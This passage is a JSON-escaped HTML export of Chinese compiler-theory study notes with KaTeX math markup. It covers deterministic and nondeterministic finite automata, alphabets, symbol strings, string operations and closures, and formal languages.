mtight\"><span class=\"mord mtight\"><span class=\"mord mathdefault mtight\">i</span></span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span></span></span></span>、输入字符为<span class=\"katex\"><span class=\"katex-mathml\"><math><semantics><mrow><mi>a</mi></mrow><annotation encoding=\"application/x-tex\">a</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.43056em;vertical-align:0em;\"></span><span class=\"mord mathdefault\">a</span></span></span></span>时，自动机就转换到下一个状态<span class=\"katex\"><span class=\"katex-mathml\"><math><semantics><mrow><msub><mi>q</mi><mi>j</mi></msub></mrow><annotation encoding=\"application/x-tex\">q_{j}</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.716668em;vertical-align:-0.286108em;\"></span><span class=\"mord\"><span class=\"mord mathdefault\" style=\"margin-right:0.03588em;\">q</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.311664em;\"><span style=\"top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mathdefault mtight\" style=\"margin-right:0.05724em;\">j</span></span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.286108em;\"><span></span></span></span></span></span></span></span></span></span>。此时<span class=\"katex\"><span class=\"katex-mathml\"><math><semantics><mrow><msub><mi>q</mi><mi>j</mi></msub></mrow><annotation encoding=\"application/x-tex\">q_{j}</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.716668em;vertical-align:-0.286108em;\"></span><span class=\"mord\"><span class=\"mord mathdefault\" style=\"margin-right:0.03588em;\">q</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.311664em;\"><span style=\"top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mathdefault mtight\" style=\"margin-right:0.05724em;\">j</span></span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.286108em;\"><span></span></span></span></span></span></span></span></span></span>称为<span class=\"katex\"><span class=\"katex-mathml\"><math><semantics><mrow><msub><mi>q</mi><mi>i</mi></msub></mrow><annotation encoding=\"application/x-tex\">q_{i}</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.625em;vertical-align:-0.19444em;\"></span><span class=\"mord\"><span class=\"mord mathdefault\" style=\"margin-right:0.03588em;\">q</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.31166399999999994em;\"><span style=\"top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mathdefault mtight\">i</span></span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span></span></span></span>的一个后继状态。</p>\n<p>单射的意义：任意一个状态与输入的二元组都<strong>唯一</strong>确定了下一个状态。</p>\n<p>一个DFA可以用一个矩阵表示，也可以用图表示。</p>\n<ul>\n<li>用矩阵表示时，行表示状态，列表示输入符号，矩阵元素表示<span class=\"katex\"><span class=\"katex-mathml\"><math><semantics><mrow><mi>f</mi><mrow><mo fence=\"true\">(</mo><mi>q</mi><mo separator=\"true\">,</mo><mi>a</mi><mo fence=\"true\">)</mo></mrow></mrow><annotation encoding=\"application/x-tex\">f\\left(q,a\\right)</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:1em;vertical-align:-0.25em;\"></span><span class=\"mord mathdefault\" style=\"margin-right:0.10764em;\">f</span><span class=\"mspace\" style=\"margin-right:0.16666666666666666em;\"></span><span class=\"minner\"><span class=\"mopen delimcenter\" style=\"top:0em;\">(</span><span class=\"mord mathdefault\" style=\"margin-right:0.03588em;\">q</span><span class=\"mpunct\">,</span><span class=\"mspace\" style=\"margin-right:0.16666666666666666em;\"></span><span class=\"mord mathdefault\">a</span><span class=\"mclose delimcenter\" style=\"top:0em;\">)</span></span></span></span></span></li>\n<li>用图表示时，假设有m个状态和n个输入字符，则图含有m个状态结，每个状态结<strong>最多</strong>有n条<strong>箭弧</strong>与别的状态结连接。整个图含有<strong>唯一</strong>一个初态结和多个终态结。</li>\n<li>对于<span class=\"katex\"><span class=\"katex-mathml\"><math><semantics><mrow><msup><mi mathvariant=\"normal\">Σ</mi><mo>∗</mo></msup></mrow><annotation encoding=\"application/x-tex\">\\Sigma^{*}</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.688696em;vertical-align:0em;\"></span><span class=\"mord\"><span class=\"mord\">Σ</span><span class=\"msupsub\"><span class=\"vlist-t\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.688696em;\"><span style=\"top:-3.063em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mtight\">∗</span></span></span></span></span></span></span></span></span></span></span></span>中的任意符号串<span class=\"katex\"><span class=\"katex-mathml\"><math><semantics><mrow><mi>β</mi></mrow><annotation encoding=\"application/x-tex\">\\beta</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.8888799999999999em;vertical-align:-0.19444em;\"></span><span class=\"mord mathdefault\" style=\"margin-right:0.05278em;\">β</span></span></span></span>，若存在一条路从初态结到终态结，且这条路上所有的符号连成的符号串等于<span class=\"katex\"><span class=\"katex-mathml\"><math><semantics><mrow><mi>β</mi></mrow><annotation encoding=\"application/x-tex\">\\beta</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.8888799999999999em;vertical-align:-0.19444em;\"></span><span class=\"mord mathdefault\" style=\"margin-right:0.05278em;\">β</span></span></span></span>，则称：<strong><span class=\"katex\"><span class=\"katex-mathml\"><math><semantics><mrow><mi>β</mi></mrow><annotation encoding=\"application/x-tex\">\\beta</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.8888799999999999em;vertical-align:-0.19444em;\"></span><span class=\"mord mathdefault\" style=\"margin-right:0.05278em;\">β</span></span></span></span>被DFA <span class=\"katex\"><span class=\"katex-mathml\"><math><semantics><mrow><mi>M</mi></mrow><annotation encoding=\"application/x-tex\">M</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.68333em;vertical-align:0em;\"></span><span class=\"mord mathdefault\" style=\"margin-right:0.10903em;\">M</span></span></span></span>所识别</strong>。</li>\n<li>若<span class=\"katex\"><span class=\"katex-mathml\"><math><semantics><mrow><mi>M</mi></mrow><annotation encoding=\"application/x-tex\">M</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.68333em;vertical-align:0em;\"></span><span class=\"mord mathdefault\" style=\"margin-right:0.10903em;\">M</span></span></span></span>的初态结也是终态结，那么<span class=\"katex\"><span class=\"katex-mathml\"><math><semantics><mrow><mi>ϵ</mi></mrow><annotation encoding=\"application/x-tex\">\\epsilon</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.43056em;vertical-align:0em;\"></span><span class=\"mord mathdefault\">ϵ</span></span></span></span>也可以被识别。</li>\n<li>DFA <span class=\"katex\"><span class=\"katex-mathml\"><math><semantics><mrow><mi>M</mi></mrow><annotation encoding=\"application/x-tex\">M</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.68333em;vertical-align:0em;\"></span><span class=\"mord mathdefault\" style=\"margin-right:0.10903em;\">M</span></span></span></span>可识别的符号串的全体记为<span class=\"katex\"><span class=\"katex-mathml\"><math><semantics><mrow><mi>L</mi><mrow><mo fence=\"true\">(</mo><mi>M</mi><mo fence=\"true\">)</mo></mrow></mrow><annotation encoding=\"application/x-tex\">L\\left(M\\right)</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:1em;vertical-align:-0.25em;\"></span><span class=\"mord mathdefault\">L</span><span class=\"mspace\" style=\"margin-right:0.16666666666666666em;\"></span><span class=\"minner\"><span class=\"mopen delimcenter\" style=\"top:0em;\">(</span><span class=\"mord mathdefault\" style=\"margin-right:0.10903em;\">M</span><span class=\"mclose delimcenter\" style=\"top:0em;\">)</span></span></span></span></span>。</li>\n</ul>\n<h4 id=\"非确定有穷自动机-nfa\"><a class=\"markdownIt-Anchor\" href=\"#非确定有穷自动机-nfa\"></a> 非确定有穷自动机 NFA</h4>\n<p>一个NFA也是一个五元组<span class=\"katex\"><span class=\"katex-mathml\"><math><semantics><mrow><mi>M</mi><mo>=</mo><mrow><mo fence=\"true\">(</mo><mi>Q</mi><mo separator=\"true\">,</mo><mi mathvariant=\"normal\">Σ</mi><mo separator=\"true\">,</mo><mi>f</mi><mo separator=\"true\">,</mo><mi>S</mi><mo separator=\"true\">,</mo><mi>Z</mi><mo fence=\"true\">)</mo></mrow></mrow><annotation encoding=\"application/x-tex\">M=\\left(Q,\\Sigma,f,S,Z\\right)</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.68333em;vertical-align:0em;\"></span><span class=\"mord mathdefault\" style=\"margin-right:0.10903em;\">M</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\">=</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:1em;vertical-align:-0.25em;\"></span><span class=\"minner\"><span class=\"mopen delimcenter\" style=\"top:0em;\">(</span><span class=\"mord mathdefault\">Q</span><span class=\"mpunct\">,</span><span class=\"mspace\" style=\"margin-right:0.16666666666666666em;\"></span><span class=\"mord\">Σ</span><span class=\"mpunct\">,</span><span class=\"mspace\" style=\"margin-right:0.16666666666666666em;\"></span><span class=\"mord mathdefault\" style=\"margin-right:0.10764em;\">f</span><span class=\"mpunct\">,</span><span class=\"mspace\" style=\"margin-right:0.16666666666666666em;\"></span><span class=\"mord mathdefault\" style=\"margin-right:0.05764em;\">S</span><span class=\"mpunct\">,</span><span class=\"mspace\" style=\"margin-right:0.16666666666666666em;\"></span><span class=\"mord mathdefault\" style=\"margin-right:0.07153em;\">Z</span><span class=\"mclose delimcenter\" style=\"top:0em;\">)</span></span></span></span></span>，其中</p>\n<ol>\n<li><span class=\"katex\"><span class=\"katex-mathml\"><math><semantics><mrow><mi>Q</mi><mo separator=\"true\">,</mo><mi mathvariant=\"normal\">Σ</mi><mo separator=\"true\">,</mo><mi>Z</mi></mrow><annotation encoding=\"application/x-tex\">Q,\\Sigma,Z</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.8777699999999999em;vertical-align:-0.19444em;\"></span><span class=\"mord mathdefault\">Q</span><span class=\"mpunct\">,</span><span class=\"mspace\" style=\"margin-right:0.16666666666666666em;\"></span><span class=\"mord\">Σ</span><span class=\"mpunct\">,</span><span class=\"mspace\" style=\"margin-right:0.16666666666666666em;\"></span><span class=\"mord mathdefault\" style=\"margin-right:0.07153em;\">Z</span></span></span></span>与DFA中相同；</li>\n<li><span class=\"katex\"><span class=\"katex-mathml\"><math><semantics><mrow><mi>f</mi></mrow><annotation encoding=\"application/x-tex\">f</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.8888799999999999em;vertical-align:-0.19444em;\"></span><span class=\"mord mathdefault\" style=\"margin-right:0.10764em;\">f</span></span></span></span>不再是单射，而是一个<strong>多值</strong>函数，映射出一个集合；</li>\n<li><span class=\"katex\"><span class=\"katex-mathml\"><math><semantics><mrow><mi>f</mi><mrow><mo fence=\"true\">(</mo><msub><mi>q</mi><mi>i</mi></msub><mo separator=\"true\">,</mo><mi>a</mi><mo fence=\"true\">)</mo></mrow><mo>=</mo><mrow><mo fence=\"true\">{</mo><mi mathvariant=\"normal\">某</mi><mi mathvariant=\"normal\">些</mi><mi mathvariant=\"normal\">状</mi><mi mathvariant=\"normal\">态</mi><mi mathvariant=\"normal\">的</mi><mi mathvariant=\"normal\">集</mi><mi mathvariant=\"normal\">合</mi><mo fence=\"true\">}</mo></mrow></mrow><annotation encoding=\"application/x-tex\">f\\left(q_{i},a\\right)=\\left\\{某些状态的集合\\right\\}</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:1em;vertical-align:-0.25em;\"></span><span class=\"mord mathdefault\" style=\"margin-right:0.10764em;\">f</span><span class=\"mspace\" style=\"margin-right:0.16666666666666666em;\"></span><span class=\"minner\"><span class=\"mopen delimcenter\" style=\"top:0em;\">(</span><span class=\"mord\"><span class=\"mord mathdefault\" style=\"margin-right:0.03588em;\">q</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.31166399999999994em;\"><span style=\"top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mathdefault mtight\">i</span></span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span><span class=\"mpunct\">,</span><span class=\"mspace\" style=\"margin-right:0.16666666666666666em;\"></span><span class=\"mord mathdefault\">a</span><span class=\"mclose delimcenter\" style=\"top:0em;\">)</span></span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\">=</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:1em;vertical-align:-0.25em;\"></span><span class=\"minner\"><span class=\"mopen delimcenter\" style=\"top:0em;\">{</span><span class=\"mord cjk_fallback\">某</span><span class=\"mord cjk_fallback\">些</span><span class=\"mord cjk_fallback\">状</span><span class=\"mord cjk_fallback\">态</span><span class=\"mord cjk_fallback\">的</span><span class=\"mord cjk_fallback\">集</span><span class=\"mord cjk_fallback\">合</span><span class=\"mclose delimcenter\" style=\"top:0em;\">}</span></span></span></span></span>；</li>\n<li><span class=\"katex\"><span class=\"katex-mathml\"><math><semantics><mrow><mi>S</mi><mo>⊂</mo><mi>Q</mi></mrow><annotation encoding=\"application/x-tex\">S \\subset Q</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.72243em;vertical-align:-0.0391em;\"></span><span class=\"mord mathdefault\" style=\"margin-right:0.05764em;\">S</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\">⊂</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:0.8777699999999999em;vertical-align:-0.19444em;\"></span><span class=\"mord mathdefault\">Q</span></span></span></span>是<strong>非空初态集</strong>。</li>\n</ol>\n<ul>\n<li>NFA允许状态图中，边的标记为<span class=\"katex\"><span class=\"katex-mathml\"><math><semantics><mrow><mi>ϵ</mi></mrow><annotation encoding=\"application/x-tex\">\\epsilon</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.43056em;vertical-align:0em;\"></span><span class=\"mord mathdefault\">ϵ</span></span></span></span>。</li>\n<li></li>\n</ul>\n","site":{"data":{}},"excerpt":"","more":"<h2 id=\"文法和语言\"><a class=\"markdownIt-Anchor\" href=\"#文法和语言\"></a> 文法和语言</h2>\n<h3 id=\"字母表和符号串\"><a class=\"markdownIt-Anchor\" href=\"#字母表和符号串\"></a> 字母表和符号串</h3>\n<ol>\n<li>字母表是非空元素的<strong>集合</strong>。用<span class=\"katex\"><span class=\"katex-mathml\"><math><semantics><mrow><mi mathvariant=\"normal\">Σ</mi></mrow><annotation encoding=\"application/x-tex\">\\Sigma</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.68333em;vertical-align:0em;\"></span><span class=\"mord\">Σ</span></span></span></span>表示</li>\n<li>字母表中的元素称为<strong>符号</strong>或者<strong>字符</strong>。</li>\n<li>符号所形成的有穷有序序列称为<strong>符号串</strong>。</li>\n<li><span class=\"katex\"><span class=\"katex-mathml\"><math><semantics><mrow><mi>ϵ</mi></mrow><annotation encoding=\"application/x-tex\">\\epsilon</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.43056em;vertical-align:0em;\"></span><span class=\"mord mathdefault\">ϵ</span></span></span></span>记为空符号串。</li>\n</ol>\n<p><span class=\"katex-display\"><span class=\"katex\"><span class=\"katex-mathml\"><math><semantics><mrow><mi>x</mi><mo>=</mo><mi>y</mi></mrow><annotation encoding=\"application/x-tex\">x=y\n</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.43056em;vertical-align:0em;\"></span><span class=\"mord mathdefault\">x</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\">=</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:0.625em;vertical-align:-0.19444em;\"></span><span class=\"mord mathdefault\" style=\"margin-right:0.03588em;\">y</span></span></span></span></span></p>\n<h3 id=\"符号串的形式运算\"><a class=\"markdownIt-Anchor\" href=\"#符号串的形式运算\"></a> 符号串的形式运算</h3>\n<ol>\n<li>若<span class=\"katex\"><span class=\"katex-mathml\"><math><semantics><mrow><mi>x</mi></mrow><annotation encoding=\"application/x-tex\">x</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.43056em;vertical-align:0em;\"></span><span class=\"mord mathdefault\">x</span></span></span></span>和<span class=\"katex\"><span class=\"katex-mathml\"><math><semantics><mrow><mi>y</mi></mrow><annotation encoding=\"application/x-tex\">y</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.625em;vertical-align:-0.19444em;\"></span><span class=\"mord mathdefault\" style=\"margin-right:0.03588em;\">y</span></span></span></span>是符号串，则<span class=\"katex\"><span class=\"katex-mathml\"><math><semantics><mrow><mi>x</mi><mi>y</mi></mrow><annotation encoding=\"application/x-tex\">xy</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.625em;vertical-align:-0.19444em;\"></span><span class=\"mord mathdefault\">x</span><span class=\"mord mathdefault\" style=\"margin-right:0.03588em;\">y</span></span></span></span>记为把<span class=\"katex\"><span class=\"katex-mathml\"><math><semantics><mrow><mi>y</mi></mrow><annotation encoding=\"application/x-tex\">y</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.625em;vertical-align:-0.19444em;\"></span><span class=\"mord mathdefault\" style=\"margin-right:0.03588em;\">y</span></span></span></span>写在<span class=\"katex\"><span class=\"katex-mathml\"><math><semantics><mrow><mi>x</mi></mrow><annotation encoding=\"application/x-tex\">x</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.43056em;vertical-align:0em;\"></span><span class=\"mord mathdefault\">x</span></span></span></span>后面形成的符号串。</li>\n<li><strong>符号串的集合</strong>的乘积定义为集合的笛卡儿积。</li>\n<li>符号串整数幂运算定义为多次乘积。特别地，<span class=\"katex\"><span class=\"katex-mathml\"><math><semantics><mrow><msup><mi>x</mi><mn>0</mn></msup><mo>=</mo><mi>ϵ</mi></mrow><annotation encoding=\"application/x-tex\">x^{0}=\\epsilon</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.8141079999999999em;vertical-align:0em;\"></span><span class=\"mord\"><span class=\"mord mathdefault\">x</span><span class=\"msupsub\"><span class=\"vlist-t\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.8141079999999999em;\"><span style=\"top:-3.063em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mtight\">0</span></span></span></span></span></span></span></span></span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\">=</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:0.43056em;vertical-align:0em;\"></span><span class=\"mord mathdefault\">ϵ</span></span></span></span>。</li>\n<li>符号串集合的幂运算定义为多次笛卡儿积。特别地，<span class=\"katex\"><span class=\"katex-mathml\"><math><semantics><mrow><msup><mi>A</mi><mn>0</mn></msup><mo>=</mo><mrow><mo fence=\"true\">{</mo><mi>ϵ</mi><mo fence=\"true\">}</mo></mrow></mrow><annotation encoding=\"application/x-tex\">A^{0}=\\left\\{\\epsilon\\right\\}</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.8141079999999999em;vertical-align:0em;\"></span><span class=\"mord\"><span class=\"mord mathdefault\">A</span><span class=\"msupsub\"><span class=\"vlist-t\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.8141079999999999em;\"><span style=\"top:-3.063em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mtight\">0</span></span></span></span></span></span></span></span></span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\">=</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:1em;vertical-align:-0.25em;\"></span><span class=\"minner\"><span class=\"mopen delimcenter\" style=\"top:0em;\">{</span><span class=\"mord mathdefault\">ϵ</span><span class=\"mclose delimcenter\" style=\"top:0em;\">}</span></span></span></span></span>。</li>\n<li>符号串集合<span class=\"katex\"><span class=\"katex-mathml\"><math><semantics><mrow><mi>a</mi></mrow><annotation encoding=\"application/x-tex\">a</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.43056em;vertical-align:0em;\"></span><span class=\"mord mathdefault\">a</span></span></span></span>的闭包定义为</li>\n</ol>\n<p><span class=\"katex-display\"><span class=\"katex\"><span class=\"katex-mathml\"><math><semantics><mrow><msup><mi>A</mi><mo>+</mo></msup><mo>=</mo><msup><mi>A</mi><mn>1</mn></msup><mo>∪</mo><msup><mi>A</mi><mn>2</mn></msup><mo>∪</mo><mi mathvariant=\"normal\">.</mi><mi mathvariant=\"normal\">.</mi><mi mathvariant=\"normal\">.</mi><mspace linebreak=\"newline\"></mspace><msup><mi>A</mi><mo>∗</mo></msup><mo>=</mo><msup><mi>A</mi><mn>0</mn></msup><mo>∪</mo><msup><mi>A</mi><mn>1</mn></msup><mo>∪</mo><mi mathvariant=\"normal\">.</mi><mi mathvariant=\"normal\">.</mi><mi mathvariant=\"normal\">.</mi></mrow><annotation encoding=\"application/x-tex\">A^{+}=A^{1}\\cup A^{2} \\cup ...\\\\\nA^{*}=A^{0}\\cup A^{1} \\cup ...\n</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.821331em;vertical-align:0em;\"></span><span class=\"mord\"><span class=\"mord mathdefault\">A</span><span class=\"msupsub\"><span class=\"vlist-t\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.821331em;\"><span style=\"top:-3.113em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mtight\">+</span></span></span></span></span></span></span></span></span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\">=</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:0.8641079999999999em;vertical-align:0em;\"></span><span class=\"mord\"><span class=\"mord mathdefault\">A</span><span class=\"msupsub\"><span class=\"vlist-t\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.8641079999999999em;\"><span style=\"top:-3.113em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mtight\">1</span></span></span></span></span></span></span></span></span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span><span class=\"mbin\">∪</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:0.8641079999999999em;vertical-align:0em;\"></span><span class=\"mord\"><span class=\"mord mathdefault\">A</span><span class=\"msupsub\"><span class=\"vlist-t\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.8641079999999999em;\"><span style=\"top:-3.113em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mtight\">2</span></span></span></span></span></span></span></span></span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span><span class=\"mbin\">∪</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:0.10556em;vertical-align:0em;\"></span><span class=\"mord\">.</span><span class=\"mord\">.</span><span class=\"mord\">.</span></span><span class=\"mspace newline\"></span><span class=\"base\"><span class=\"strut\" style=\"height:0.738696em;vertical-align:0em;\"></span><span class=\"mord\"><span class=\"mord mathdefault\">A</span><span class=\"msupsub\"><span class=\"vlist-t\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.738696em;\"><span style=\"top:-3.113em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mtight\">∗</span></span></span></span></span></span></span></span></span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\">=</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:0.8641079999999999em;vertical-align:0em;\"></span><span class=\"mord\"><span class=\"mord mathdefault\">A</span><span class=\"msupsub\"><span class=\"vlist-t\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.8641079999999999em;\"><span style=\"top:-3.113em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mtight\">0</span></span></span></span></span></span></span></span></span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span><span class=\"mbin\">∪</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:0.8641079999999999em;vertical-align:0em;\"></span><span class=\"mord\"><span class=\"mord mathdefault\">A</span><span class=\"msupsub\"><span class=\"vlist-t\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.8641079999999999em;\"><span style=\"top:-3.113em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mtight\">1</span></span></span></span></span></span></span></span></span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span><span class=\"mbin\">∪</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:0.10556em;vertical-align:0em;\"></span><span class=\"mord\">.</span><span class=\"mord\">.</span><span class=\"mord\">.</span></span></span></span></span></p>\n<h3 id=\"形式语言\"><a class=\"markdownIt-Anchor\" href=\"#形式语言\"></a> 形式语言</h3>\n<ol>\n<li>符号串的集合是形式语言。</li>\n<li>形式语言不考虑语义。</li>\n<li>当语言是有穷集合时，用枚举方法表示。</li>\n<li>当语言是无穷集合时，用<strong>文法</strong>表示语言。</li>\n</ol>\n<h3 id=\"文法\"><a class=\"markdownIt-Anchor\" href=\"#文法\"></a> 